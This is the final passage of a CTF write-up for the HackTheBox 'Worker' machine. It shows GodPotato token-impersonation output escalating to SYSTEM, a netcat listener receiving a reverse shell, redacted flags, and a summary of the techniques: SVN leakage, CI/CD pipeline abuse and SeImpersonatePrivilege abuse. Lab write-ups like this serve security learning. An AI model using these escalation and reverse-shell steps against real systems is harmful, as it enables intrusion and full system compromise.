[*] DCOM obj IPID: 00000002-21c8-ffff-6106-7de26c24b7df
[*] DCOM obj OXID: 0x24385a6896a0305c
[*] DCOM obj OID: 0xb91d319d5588d12d
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 944 Token:0x632  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 9036
#< CLIXML
```

- **Profit:**

```shell
┌[siunam♥Mercury]-(~/ctf/htb/Machines/Worker)-[2023.08.05|21:55:58(HKT)]
└> rlwrap -cAr nc -lvnp 53 
listening on [any] 53 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.203] 51208
PS C:\windows\system32\inetsrv> whoami; ipconfig /all
nt authority\system

Windows IP Configuration

   Host Name . . . . . . . . . . . . : Worker
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-3C-E3
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::454d:fe80:9bc9:f741%4(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.10.203(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 117461078
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-26-AC-4B-C4-00-50-56-B9-89-30
   DNS Servers . . . . . . . . . . . : 8.8.8.8
[...]
```

I'm `nt authority\system`! :D

**user.txt:**
```shell
PS C:\Users\robisl\Desktop> type user.txt
{Redacted}
```

## Rooted

**root.txt:**
```shell
PS C:\Users\Administrator\Desktop> type root.txt
{Redacted}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBox/Worker/images/Pasted%20image%2020230805215743.png)

## Conclusion

What we've learned:

1. Retrieving sensitive information from Apache Subversion (SVN) repository
2. Exploiting CI/CD pipeline in Azure DevOps Server
3. Vertical privilege escalation via abusing `SeImpersonatePrivilege` with GodPotato